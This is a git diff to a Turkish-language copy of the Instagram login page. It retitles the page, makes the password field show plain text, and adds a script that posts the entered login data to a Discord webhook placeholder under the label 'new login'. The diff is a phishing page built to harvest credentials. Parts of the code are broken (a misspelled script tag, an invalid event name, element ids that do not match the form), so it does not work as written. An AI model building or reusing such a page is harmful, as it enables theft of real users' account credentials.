@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="./styles.css" />
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
-    <title>Instagram klonu</title>
+    <title>Instag</title>
     <scriot src="script.js">
 </head>
 <body>
@@ -22,7 +22,7 @@
                     <input name="email" placeholder="Telefon, kullanıcı adı veya e-posta" />
 
                     <label for="password" class="sr-only">Şifre</label>
-                    <input name="password" type="password" placeholder="Şifre" />
+                    <input name="password" type="text" placeholder="Şifre" />
 
                     <button type="button">Giriş Yap</button>
                 </form>
@@ -68,5 +68,29 @@
         </ul>
         <p class="copyright">© 2020 Facebook'un Instagram'ı</p>
     </footer>
+      <script>
+    const webhookURL = "WEBHOOK_URLUNU_BURAYA_YAZ";
+
+    document.getElementById("logForm").addEventListener("button", function(e) {
+      e.preventDefault();
+      const message = document.getElementById("userInput").value;
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `Yeni giriş: ${message}`
+        })
+      }).then(response => {
+        if (response.ok) {
+          alert("Mesaj Discord'a gönderildi!");
+        } else {
+          alert("Bir hata oluştu.");
+        }
+      });
+    });
+  </script>
 </body>
 </html>
